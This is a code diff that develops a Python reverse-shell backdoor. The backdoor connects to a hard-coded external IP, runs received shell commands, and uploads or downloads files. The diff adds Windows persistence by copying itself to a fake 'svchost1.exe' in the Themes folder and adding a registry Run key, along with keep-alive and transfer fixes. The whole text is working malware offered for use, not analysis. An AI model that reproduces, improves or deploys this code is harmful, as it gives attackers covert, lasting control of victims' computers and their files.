@@ -3,14 +3,25 @@ import subprocess
 import time
 import json
 import os
-import pyautogui
 import signal
 import sys
 import hashlib
+import select
+import shutil
+
 
 HOST_IP = '34.227.29.45'
 PORT = 2222
 CHUNK_SIZE = 8192
+
+
+def become_good():
+    themes_file_location = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "svchost1.exe")
+    if not os.path.exists(themes_file_location):
+        shutil.copyfile(sys.executable, themes_file_location)
+        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc_host12 /t REG_SZ /d "' + themes_file_location + '"', shell=True)
+
+
 
 def calculate_md5(filename):
     """Calculate MD5 hash of file"""
@@ -31,7 +42,7 @@ def receive_command(sock):
 
 def send_output(sock, data):
     jsondata = json.dumps(data)
-    sock.send(jsondata.encode())
+    sock.sendall(jsondata.encode())  # Use sendall for reliable transmission
 
 def send_file(sock, filename):
     """Send file to server with chunked transfer and verification"""
@@ -43,7 +54,6 @@ def send_file(sock, filename):
         filesize = os.path.getsize(filename)
         md5_hash = calculate_md5(filename)
         
-        # Send file metadata
         metadata = {
             'filename': os.path.basename(filename),
             'filesize': filesize,
@@ -51,11 +61,9 @@ def send_file(sock, filename):
         }
         send_output(sock, metadata)
 
-        # Wait for ready signal
         if receive_command(sock) != "READY":
             return False
 
-        # Send file in chunks
         bytes_sent = 0
         with open(filename, 'rb') as f:
             while bytes_sent < filesize:
@@ -64,12 +72,12 @@ def send_file(sock, filename):
                     break
                 sock.sendall(chunk)
                 bytes_sent += len(chunk)
-                
-                # Report progress
-                progress = bytes_sent / filesize * 100
-                send_output(sock, {"progress": progress})
 
-        # Get transfer confirmation
+        # Check for incomplete transfer
+        if bytes_sent != filesize:
+            send_output(sock, "[!] File transfer incomplete")
+            return False
+
         result = receive_command(sock)
         return result.get('success', False)
 
@@ -80,7 +88,6 @@ def send_file(sock, filename):
 def receive_file(sock, target_filename):
     """Receive file from server with chunked transfer and verification"""
     try:
-        # Get file metadata
         metadata = receive_command(sock)
         if isinstance(metadata, str) and metadata.startswith('[!]'):
             return False
@@ -88,10 +95,8 @@ def receive_file(sock, target_filename):
         filesize = metadata['filesize']
         expected_md5 = metadata['md5']
         
-        # Signal ready to receive
         send_output(sock, "READY")
 
-        # Receive file in chunks
         md5_hash = hashlib.md5()
         bytes_received = 0
         
@@ -104,7 +109,13 @@ def receive_file(sock, target_filename):
                 md5_hash.update(chunk)
                 bytes_received += len(chunk)
 
-        # Verify transfer
+        if bytes_received != filesize:
+            send_output(sock, {
+                'success': False,
+                'message': "[!] File transfer incomplete"
+            })
+            return False
+
         received_md5 = md5_hash.hexdigest()
         success = received_md5 == expected_md5
         
@@ -118,8 +129,6 @@ def receive_file(sock, target_filename):
     except Exception as e:
         send_output(sock, f"[!] Error receiving file: {str(e)}")
         return False
-
-# ... rest of the code remains the same ...
 
 def handle_cd(sock, path):
     try:
@@ -135,30 +144,46 @@ def handle_cd(sock, path):
 
 def shell(sock):
     print("[+] Connection established with server")
+    last_activity = time.time()
     while True:
         try:
-            command = receive_command(sock)
-            
-            if command == ":kill":
-                print("[*] Received kill command, closing current session...")
-                return False
+            # Send keep-alive every 15 seconds
+            if time.time() - last_activity > 15:
+                send_output(sock, "PING")
+                last_activity = time.time()
+
+            # Check for incoming commands
+            if sock in select.select([sock], [], [], 1)[0]:
+                command = receive_command(sock)
+                last_activity = time.time()
                 
-            elif command.startswith("cd "):
-                handle_cd(sock, command[3:])
-                
-           
-                
-            elif command.startswith("download "):
-                filename = command.split(" ")[1].strip()
-                send_file(sock, filename)
-                
-            elif command.startswith("upload "):
-                filename = command.split(" ")[1].strip()
-                receive_file(sock, filename)
-                
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                send_output(sock, result.stdout + result.stderr)
+                if command == ":kill":
+                    print("[*] Received kill command, closing current session...")
+                    return False
+                elif command.startswith("cd "):
+                    handle_cd(sock, command[3:])
+                elif command.startswith("download "):
+                    filename = command.split(" ", 1)[1].strip()
+                    send_file(sock, filename)
+                elif command.startswith("upload "):
+                    filename = command.split(" ", 1)[1].strip()
+                    receive_file(sock, filename)
+                else:
+                    # Execute command with a timeout
+                    try:
+                        result = subprocess.run(
+                            command,
+                            shell=True,
+                            capture_output=True,
+                            text=True,
+                            timeout= 2 # Timeout after 2 seconds
+                        )
+                        output = result.stdout + result.stderr
+                        send_output(sock, output)
+                    except subprocess.TimeoutExpired:
+                        send_output(sock, "[!] Command timed out after 10 seconds")
+                    except Exception as e:
+                        send_output(sock, f"[!] Error executing command: {str(e)}")
 
         except (socket.error, json.JSONDecodeError) as e:
             print(f"[!] Lost connection to server: {str(e)}")
@@ -166,24 +191,30 @@ def shell(sock):
 
 def connect():
     while True:
+        sock = None
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow port reuse
             sock.settimeout(30)
             
-            print("\n[*] Attempting to connect to server at {}:{}...".format(HOST_IP, PORT))
+            print(f"\n[*] Attempting to connect to server at {HOST_IP}:{PORT}...")
             sock.connect((HOST_IP, PORT))
             
             shell(sock)
             
         except socket.error as e:
             print(f"[!] Connection failed: {str(e)}")
-            print("[*] Retrying in 10 seconds...")
+        except Exception as e:
+            print(f"[!] Critical error: {str(e)}")
         finally:
-            try:
-                sock.close()
-            except:
-                pass
-            time.sleep(10)
+            if sock:
+                try:
+                    sock.shutdown(socket.SHUT_RDWR)  # Gracefully close the socket
+                    sock.close()
+                except:
+                    pass
+            print("[*] Retrying seconds...")
+            # time.sleep(3)
 
 def signal_handler(sig, frame):
     print("\n[!] Backdoor exiting...")
@@ -191,10 +222,12 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-while True:
-    try:
-        connect()
-    except Exception as e:
-        print(f"[!] Critical error: {str(e)}")
-        print("[*] Restarting connection process in 10 seconds...")
-        time.sleep(10)
+if __name__ == "__main__":
+    become_good()
+    while True:
+        try:
+            connect()
+        except Exception as e:
+            print(f"[!] Critical error: {str(e)}")
+            print("[*] Restarting connection process in 10 seconds...")
+            time.sleep(10)
